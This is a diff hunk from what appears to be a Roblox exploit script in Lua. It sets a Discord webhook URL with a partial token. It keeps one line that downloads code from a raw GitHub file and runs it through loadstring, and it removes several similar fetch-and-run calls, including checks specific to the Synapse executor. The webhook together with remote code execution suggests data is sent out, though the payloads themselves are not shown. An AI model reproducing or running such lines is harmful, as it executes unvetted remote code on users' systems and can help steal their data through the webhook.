@@ -1033,13 +1033,7 @@ _G.WebhookURL = "https://canary.discord.com/api/webhooks/792159049511731220/6EkP
 EmbedColor = "16763904"; -- Color from Discohook.org. / It's an Decimal color. Use https://convertingcolors.com do convert color to Decimal color.
 
 loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Th12353/heesj/main/Fkofqwekwodf"))('pizza')
-wait(2)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Th12353/fghdsgsfhhsjh/main/server"))('Made by powerless :)')
-if syn then
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Th12353/heesj/main/aacheck"))('BRUH')
-else
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Th12353/heesj/main/nonsynapxchec"))('BRUH')
-end
+
 
 
 
